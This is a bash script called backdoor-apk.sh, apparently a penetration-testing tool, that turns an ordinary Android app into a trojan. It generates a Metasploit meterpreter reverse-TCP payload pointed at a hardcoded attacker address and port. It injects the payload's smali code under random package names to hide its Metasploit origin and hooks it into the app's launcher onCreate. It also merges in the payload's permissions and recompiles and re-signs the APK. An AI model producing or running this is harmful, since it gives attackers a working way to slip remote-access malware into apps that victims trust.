#!/bin/bash

# backdoor-apk.sh

# Dana James Traversie
# Security Engineer
# Check Point Software Technologies, Ltd.

# In addition to the obvious tools/utilities
# in use the following packages were also
# required on Kali Linux
# apt-get install lib32stdc++6 lib32ncurses5 lib32z1

# usage: ./backdoor-apk.sh original.apk

# modify the following values as necessary

MSFVENOM=msfvenom
LHOST="10.6.9.31"
LPORT="1337"
APKTOOL=apktool2
MY_PATH=`pwd`
ORIG_APK_FILE=$1
RAT_APK_FILE=Rat.apk
LOG_FILE=run.log

if [ -z $ORIG_APK_FILE ]; then
  echo "[!] No original APK file specified";
  exit 1;
fi

if [ ! -f $ORIG_APK_FILE ]; then
  echo "[!] Original APK file specified does not exist";
  exit 1;
fi

echo -n "[*] Generating reverse tcp meterpreter payload...";
$MSFVENOM -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw -o $RAT_APK_FILE >$LOG_FILE 2>&1
rc=$?
echo "done.";
if [ $rc != 0 ] || [ ! -f $RAT_APK_FILE ]; then
  echo "[!] Failed to generate RAT APK file";
  exit 1;
fi
echo "[+] Handle the meterpreter connection at: $LHOST:$LPORT"

echo -n "[*] Decompiling original APK file...";
$APKTOOL d -f -o $MY_PATH/original $MY_PATH/$ORIG_APK_FILE >>$LOG_FILE 2>&1
rc=$?
echo "done.";
if [ $rc != 0 ]; then
  echo "[!] Failed to decompile original APK file";
  exit $rc;
fi

echo -n "[*] Decompiling RAT APK file...";
$APKTOOL d -f -o $MY_PATH/payload $MY_PATH/$RAT_APK_FILE >>$LOG_FILE 2>&1
rc=$?
echo "done.";
if [ $rc != 0 ]; then
  echo "[!] Failed to decompile RAT APK file";
  exit $rc;
fi

# avoid having com/metasploit/stage path to smali files
payload_primary_dir=`openssl rand -hex 16`
payload_sub_dir=`openssl rand -hex 8`

echo -n "[*] Creating new directories in original project for RAT smali files...";
mkdir -v -p $MY_PATH/original/smali/net/$payload_primary_dir/$payload_sub_dir >>$LOG_FILE 2>&1
rc=$?
echo "done.";
if [ $rc != 0 ]; then
  echo "[!] Failed to create new directories for RAT smali files";
  exit $rc;
fi

echo -n "[*] Copying RAT smali files to new directories in original project...";
cp -v $MY_PATH/payload/smali/com/metasploit/stage/Payload*.smali $MY_PATH/original/smali/net/$payload_primary_dir/$payload_sub_dir/ >>$LOG_FILE 2>&1
rc=$?
echo "done.";
if [ $rc != 0 ]; then
  echo "[!] Failed to copy RAT smali files";
  exit $rc;
fi

echo -n "[*] Fixing RAT smali files...";
sed -i 's|com\([./]\)metasploit\([./]\)stage|net\1'"$payload_primary_dir"'\2'"$payload_sub_dir"'|g' $MY_PATH/original/smali/net/$payload_primary_dir/$payload_sub_dir/Payload*.smali >>$LOG_FILE 2>&1
rc=$?
echo "done."
if [ $rc != 0 ]; then
  echo "[!] Failed to fix RAT smali files";
  exit $rc;
fi

echo -n "[*] Locating smali file to hook in original project...";
total_package=`head -n 2 $MY_PATH/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'`
tmp=`grep -B 3 "android.intent.category.LAUNCHER" $MY_PATH/original/AndroidManifest.xml|grep -B 2 "android.intent.action.MAIN"|grep -m 1 "<activity"|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'`
smali_file_to_hook=$MY_PATH/original/smali/$tmp.smali
if [ ! -f $smali_file_to_hook ]; then
  smali_file_to_hook=$MY_PATH/original/smali/$total_package$tmp.smali
fi
echo "done.";
if [ ! -f $smali_file_to_hook ]; then
  echo "[!] Failed to locate smali file to hook";
  exit 1;
fi
echo "[+] Original smali file to hook: $smali_file_to_hook";

echo -n "[*] Adding hook in original smali file...";
sed -i '/invoke.*;->onCreate.*(Landroid\/os\/Bundle;)V/a \\n\ \ \ \ invoke-static \{p0\}, Lnet\/'"$payload_primary_dir"'\/'"$payload_sub_dir"'\/Payload;->start(Landroid\/content\/Context;)V' $smali_file_to_hook >>$LOG_FILE 2>&1
grep -B 2 "net/$payload_primary_dir/$payload_sub_dir/Payload" $smali_file_to_hook >>$LOG_FILE 2>&1
rc=$?
echo "done.";
if [ $rc != 0 ]; then
  echo "[!] Failed to add hook";
  exit $rc;
fi

echo -n "[*] Merging permissions of original and payload projects...";
placeholder=`openssl rand -hex 16`
tmp_perms_file=$MY_PATH/perms.tmp
original_manifest_file=$MY_PATH/original/AndroidManifest.xml
payload_manifest_file=$MY_PATH/payload/AndroidManifest.xml
merged_manifest_file=$MY_PATH/original/AndroidManifest.xml.merged
grep "<uses-permission" $original_manifest_file > $tmp_perms_file
grep "<uses-permission" $payload_manifest_file >> $tmp_perms_file
grep "<uses-permission" $tmp_perms_file|sort|uniq > $tmp_perms_file.uniq
mv $tmp_perms_file.uniq $tmp_perms_file
sed "s/<uses-permission.*\/>/$placeholder/g" $original_manifest_file > $merged_manifest_file
cat $merged_manifest_file|uniq > $merged_manifest_file.uniq
mv $merged_manifest_file.uniq $merged_manifest_file
sed -i "s/$placeholder/$(sed -e 's/[\&/]/\\&/g' -e 's/$/\\n/' $tmp_perms_file | tr -d '\n')/" $merged_manifest_file
diff $original_manifest_file $merged_manifest_file >>$LOG_FILE 2>&1
mv $merged_manifest_file $original_manifest_file
echo "done."

echo -n "[*] Recompiling original project with backdoor...";
$APKTOOL b $MY_PATH/original >>$LOG_FILE 2>&1
rc=$?
echo "done.";
if [ $rc != 0 ]; then
  echo "[!] Failed to recompile original project with backdoor";
  exit $rc;
fi

keystore=$MY_PATH/debug.keystore
compiled_apks=$MY_PATH/original/dist/*.apk

echo -n "[*] Signing recompiled APK..."
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore $keystore -storepass android -keypass android $compiled_apks debug.key >>$LOG_FILE 2>&1
rc=$?
echo "done."
if [ $rc != 0 ]; then
  echo "[!] Failed to sign recompiled APK";
  exit $rc;
fi

exit 0
